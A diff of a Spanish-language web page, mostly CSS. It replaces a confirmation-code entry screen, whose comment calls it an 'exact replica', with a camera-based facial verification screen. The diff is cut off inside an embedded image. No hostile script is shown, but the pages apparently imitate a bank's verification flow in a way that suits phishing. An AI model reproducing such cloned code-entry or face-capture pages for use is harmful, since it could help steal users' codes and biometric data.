@@ -1,356 +1,580 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<title>Código de Confirmación</title>
-<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;700&family=Noto+Sans:wght@400;700;900&display=swap" rel="stylesheet">
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, viewport-fit=cover">
+    <title>Verificación Facial</title>
+    <style>
+        :root {
+            --primary: #007aff;
+            --success: #34c759;
+            --error: #ff3b30;
+            --warning: #ff9500;
+            --bg: #ffffff;
+            --text-main: #000000;
+            --text-sub: #8e8e93;
+        }
 
-  body {
-    font-family: 'Noto Sans', 'Roboto', sans-serif;
-    background: #e8e8e8;
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-  }
-  .screen {
-    width: 100%;
-    max-width: 430px;
-    min-height: 100vh;
-    background: #e8e8e8;
-    display: flex;
-    flex-direction: column;
-  }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+        }
 
-  /* HEADER */
-  .header {
-    height: 145px;
-    background: linear-gradient(180deg, #7a0000 0%, #b20000 35%, #df0000 65%, #c50000 100%);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    position: relative;
-    flex-shrink: 0;
-  }
-  .header img {
-    width: 76px;
-    height: 76px;
-    object-fit: contain;
-  }
-  .header-close {
-    position: absolute;
-    right: 22px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: none;
-    border: none;
-    cursor: pointer;
-    padding: 8px;
-    line-height: 0;
-  }
+        body {
+            background-color: var(--bg);
+            height: 100vh;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
 
-  /* CONTENT */
-  .content {
-    flex: 1;
-    padding: 0 28px 48px;
-    display: flex;
-    flex-direction: column;
-  }
+        /* ── Contenedor principal ── */
+        .scanner-container {
+            position: relative;
+            width: 300px;
+            height: 380px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 36px;
+        }
 
-  .back-btn {
-    display: flex;
-    align-items: center;
-    gap: 5px;
-    background: none;
-    border: none;
-    cursor: pointer;
-    font-family: 'Noto Sans', sans-serif;
-    font-size: 18px;
-    font-weight: 400;
-    color: #1a1a1a;
-    padding: 22px 0 8px;
-    letter-spacing: 0;
-  }
+        /* ── Máscara ovalada del video ── */
+        .video-mask {
+            position: absolute;
+            width: 230px;
+            height: 290px;
+            border-radius: 50% / 45%;
+            overflow: hidden;
+            z-index: 10;
+            background: #1a1a1a;
+        }
 
-  /* TÍTULO — réplica exacta: bold/black, grande, centrado */
-  h1 {
-    font-family: 'Noto Sans', 'Roboto', sans-serif;
-    font-size: 23px;
-    font-weight: 900;
-    color: #0d0d0d;
-    text-align: center;
-    margin: 30px 0 44px;
-    line-height: 1.22;
-    letter-spacing: -0.3px;
-  }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            display: block;
+        }
 
-  /* INPUT */
-  #codigo {
-    width: 100%;
-    height: 62px;
-    border-radius: 50px;
-    border: none;
-    background: #fff;
-    font-size: 26px;
-    font-weight: 700;
-    text-align: center;
-    letter-spacing: 12px;
-    color: #111;
-    outline: none;
-    box-shadow: 0 1px 4px rgba(0,0,0,0.09);
-    caret-color: #cc0000;
-    margin-bottom: 10px;
-    transition: box-shadow 0.2s;
-    font-family: 'Noto Sans', sans-serif;
-  }
-  #codigo:focus { box-shadow: 0 0 0 2px #cc0000, 0 1px 4px rgba(0,0,0,0.09); }
-  #codigo.shake { animation: shake 0.35s ease; box-shadow: 0 0 0 2px #cc0000; }
-  @keyframes shake {
-    0%,100% { transform: translateX(0); }
-    20% { transform: translateX(-8px); }
-    40% { transform: translateX(8px); }
-    60% { transform: translateX(-5px); }
-    80% { transform: translateX(5px); }
-  }
+        /* ── Silueta de cabeza (overlay SVG encima del video) ── */
+        .face-guide-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 15;
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-  .intentos-txt {
-    text-align: center;
-    font-size: 13px;
-    color: #999;
-    min-height: 20px;
-    margin-bottom: 26px;
-    font-family: 'Noto Sans', sans-serif;
-  }
-  .intentos-txt.warn { color: #cc0000; font-weight: 700; }
+        .face-silhouette {
+            width: 180px;
+            height: 230px;
+            opacity: 0.95;
+            transition: opacity 0.4s;
+        }
 
-  /* TEXTO AYUDA */
-  .help-text {
-    text-align: center;
-    font-family: 'Noto Sans', sans-serif;
-    font-size: 16px;
-    font-weight: 400;
-    color: #4a4a4a;
-    line-height: 1.65;
-    margin-bottom: 36px;
-  }
-  .help-link {
-    font-weight: 700;
-    color: #0d0d0d;
-    text-decoration: underline;
-    cursor: pointer;
-  }
+        /* ── Anillo de progreso exterior ── */
+        .progress-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 20;
+            pointer-events: none;
+        }
 
-  /* BOTÓN CONTINUAR */
-  .btn-continuar {
-    display: block;
-    width: 220px;
-    margin: 0 auto;
-    height: 56px;
-    border-radius: 50px;
-    border: none;
-    background: #d2d2d2;
-    color: #a0a0a0;
-    font-family: 'Noto Sans', sans-serif;
-    font-size: 17px;
-    font-weight: 500;
-    cursor: default;
-    transition: background 0.2s, color 0.2s, transform 0.1s;
-  }
-  .btn-continuar.active { background: #cc0000; color: #fff; cursor: pointer; }
-  .btn-continuar.active:hover  { background: #b20000; }
-  .btn-continuar.active:active { transform: scale(0.97); }
+        .ring-track {
+            transition: stroke 0.4s ease;
+        }
 
-  /* FAB */
-  .fab {
-    position: fixed;
-    bottom: 26px;
-    right: 18px;
-    width: 58px;
-    height: 58px;
-    border-radius: 50%;
-    background: #cc0000;
-    border: none;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    box-shadow: 0 4px 16px rgba(180,0,0,0.45);
-  }
+        .ring-progress {
+            transition: stroke-dashoffset 0.5s ease-in-out, stroke 0.4s ease;
+            transform-origin: 50% 50%;
+        }
 
-  /* MODAL */
-  .overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.45);
-    z-index: 100;
-    align-items: center;
-    justify-content: center;
-  }
-  .overlay.show { display: flex; }
-  .modal {
-    background: #fff;
-    border-radius: 20px;
-    padding: 32px 24px 26px;
-    max-width: 300px;
-    width: 88%;
-    text-align: center;
-  }
-  .modal h2 { font-size: 19px; font-weight: 900; margin-bottom: 10px; font-family: 'Noto Sans', sans-serif; }
-  .modal p  { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 22px; }
-  .modal-btn {
-    width: 100%; height: 50px; border-radius: 50px; border: none;
-    background: #cc0000; color: #fff; font-size: 15px; font-weight: 700;
-    cursor: pointer; font-family: 'Noto Sans', sans-serif;
-  }
-  .modal-btn:hover { background: #b30000; }
+        /* ── Luz de escaneo ── */
+        .scan-light {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg,
+                rgba(255,255,255,0) 35%,
+                rgba(255,255,255,0.55) 50%,
+                rgba(255,255,255,0) 65%);
+            z-index: 12;
+            opacity: 0;
+            animation: scanDown 2.2s infinite linear;
+            pointer-events: none;
+            border-radius: 50% / 45%;
+            transition: opacity 0.4s;
+        }
 
-  /* TOAST */
-  .toast {
-    position: fixed;
-    bottom: 95px;
-    left: 50%;
-    transform: translateX(-50%) translateY(20px);
-    background: #222;
-    color: #fff;
-    padding: 10px 20px;
-    border-radius: 40px;
-    font-size: 13px;
-    font-weight: 500;
-    opacity: 0;
-    pointer-events: none;
-    transition: opacity 0.3s, transform 0.3s;
-    white-space: nowrap;
-    z-index: 300;
-  }
-  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-</style>
+        .scan-light.active { opacity: 0.7; }
+
+        @keyframes scanDown {
+            0%   { transform: translateY(-110%); }
+            100% { transform: translateY(110%); }
+        }
+
+        /* ── Flash foto ── */
+        .flash {
+            position: fixed;
+            inset: 0;
+            background: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 100;
+            transition: opacity 0.08s;
+        }
+
+        /* ── Área de texto ── */
+        .status-area {
+            text-align: center;
+            padding: 0 24px;
+            z-index: 30;
+            min-height: 64px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .status-title {
+            font-size: 19px;
+            font-weight: 600;
+            color: var(--text-main);
+            letter-spacing: -0.3px;
+            transition: color 0.3s;
+        }
+
+        .status-sub {
+            font-size: 14px;
+            color: var(--text-sub);
+        }
+
+        /* ── Indicador de estado (punto) ── */
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--text-sub);
+            transition: background 0.3s;
+            margin-bottom: 2px;
+        }
+
+        .status-dot.good  { background: var(--success); }
+        .status-dot.warn  { background: var(--warning); }
+        .status-dot.scan  { background: var(--primary); animation: pulse 1s infinite; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ── Loader ── */
+        #loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: white;
+            z-index: 200;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e5e5e5;
+            border-top-color: #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ── Borde pulsante cuando rostro detectado ── */
+        .video-mask.face-ok {
+            box-shadow: 0 0 0 3px var(--success), 0 0 20px rgba(52,199,89,0.4);
+            transition: box-shadow 0.3s;
+        }
+
+        .video-mask.face-warn {
+            box-shadow: 0 0 0 3px var(--warning), 0 0 20px rgba(255,149,0,0.3);
+            transition: box-shadow 0.3s;
+        }
+
+        .video-mask.face-none {
+            box-shadow: 0 0 0 2px rgba(0,0,0,0.1);
+            transition: box-shadow 0.3s;
+        }
+    </style>
 </head>
+
 <body>
-<div class="screen">
 
-  <div class="header">
-    <img src="data:image/png;base64,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